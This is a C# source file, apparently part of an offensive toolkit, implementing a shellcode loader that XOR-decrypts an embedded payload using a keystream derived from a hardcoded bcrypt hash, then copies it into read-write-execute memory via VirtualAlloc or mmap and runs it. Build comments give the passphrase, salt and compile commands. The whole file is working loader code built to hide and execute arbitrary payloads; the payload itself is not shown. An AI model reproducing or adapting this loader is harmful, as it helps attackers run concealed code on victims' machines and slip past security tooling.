/*
 * bcrypt_loader.cs - bcrypt-KDF shellcode loader template (C#)
 * ============================================================
 * The builder derives a keystream from a bcrypt hash:
 *   keystream = concat( SHA256(hash || ctr_le32) ) for ctr = 0, 1, 2, ...
 * and XORs the shellcode with it. bcrypt itself is one-way: the loader
 * embeds the deterministic hash produced at build time from the
 * passphrase + salt (see payloads/bcrypt_300b.meta.json):
 *   passphrase : S3cr3tBcryptPass!
 *   salt       : $2b$10$.PGhLCTUX1gHkos6xb5t6.   (rounds = 10)
 *   hash       : $2b$10$.PGhLCTUX1gHkos6xb5t6.TRZEnsy7LE3L2D26dSiF53O6KpnY4KS
 *
 * Regenerate the payload include with the builder:
 *   python3 tools/gen_inc.py bcrypt 300 --lang cs --out loaders/csharp/bcrypt/payload_inc.cs
 *
 * Compile (mono):
 *   mcs -out:bcrypt_loader.exe bcrypt_loader.cs payload_inc.cs
 *   mono bcrypt_loader.exe
 */
using System;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;

static class BcryptLoader
{
    /* 60-char bcrypt hash string produced by the builder (the effective key). */
    static readonly string kHashStr =
        "$2b$10$.PGhLCTUX1gHkos6xb5t6.TRZEnsy7LE3L2D26dSiF53O6KpnY4KS";

    static byte[] Sha256(byte[] msg)
    {
        using (SHA256 h = SHA256.Create())
            return h.ComputeHash(msg);
    }

    /* keystream = concat( SHA256(hashStr || ctr_le32) ) for ctr = 0, 1, ... */
    static byte[] Derive(int len)
    {
        byte[] hashBytes = Encoding.ASCII.GetBytes(kHashStr);
        byte[] msg = new byte[hashBytes.Length + 4];
        byte[] ks = new byte[len];
        int made = 0;
        uint ctr = 0;
        while (made < len)
        {
            Array.Copy(hashBytes, msg, hashBytes.Length);
            msg[hashBytes.Length]     = (byte)(ctr & 0xff);
            msg[hashBytes.Length + 1] = (byte)((ctr >> 8) & 0xff);
            msg[hashBytes.Length + 2] = (byte)((ctr >> 16) & 0xff);
            msg[hashBytes.Length + 3] = (byte)((ctr >> 24) & 0xff);
            byte[] dig = Sha256(msg);
            int n = Math.Min(32, len - made);
            Array.Copy(dig, 0, ks, made, n);
            made += n;
            ctr++;
        }
        return ks;
    }

    static byte[] Decrypt(byte[] ct)
    {
        byte[] ks = Derive(ct.Length);
        byte[] pt = new byte[ct.Length];
        for (int i = 0; i < ct.Length; i++)
            pt[i] = (byte)(ct[i] ^ ks[i]);
        return pt;
    }

    /* ---------------- execution method (shared by all templates) ------- */

    delegate int PayloadFn();

    static bool IsWindows
    {
        get
        {
            PlatformID p = Environment.OSVersion.Platform;
            return p == PlatformID.Win32NT || p == PlatformID.Win32Windows || p == PlatformID.WinCE;
        }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr addr, UIntPtr size, uint freeType);

    [DllImport("libc", SetLastError = true)]
    static extern IntPtr mmap(IntPtr addr, UIntPtr length, int prot, int flags, int fd, IntPtr offset);

    [DllImport("libc", SetLastError = true)]
    static extern int munmap(IntPtr addr, UIntPtr length);

    static int Run(byte[] shellcode)
    {
        IntPtr mem;
        if (IsWindows)
        {
            mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/,
                               0x40 /*PAGE_EXECUTE_READWRITE*/);
            if (mem == IntPtr.Zero) { Console.WriteLine("[-] VirtualAlloc failed"); return -1; }
        }
        else
        {
            mem = mmap(IntPtr.Zero, (UIntPtr)shellcode.Length,
                       0x7 /*PROT_READ|PROT_WRITE|PROT_EXEC*/,
                       0x22 /*MAP_PRIVATE|MAP_ANONYMOUS*/, -1, IntPtr.Zero);
            if (mem == new IntPtr(-1)) { Console.WriteLine("[-] mmap failed"); return -1; }
        }
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        int r = ((PayloadFn)Marshal.GetDelegateForFunctionPointer(mem, typeof(PayloadFn)))();
        if (IsWindows)
            VirtualFree(mem, UIntPtr.Zero, 0x8000 /*MEM_RELEASE*/);
        else
            munmap(mem, (UIntPtr)shellcode.Length);
        return r;
    }

    public static void Main()
    {
        byte[] plain = Decrypt(Payload.Data);
        Console.WriteLine("[+] bcrypt decrypted " + plain.Length + " bytes (hash " + kHashStr + ")");
        int r = Run(plain);
        Console.WriteLine("[+] payload returned " + r);
    }
}
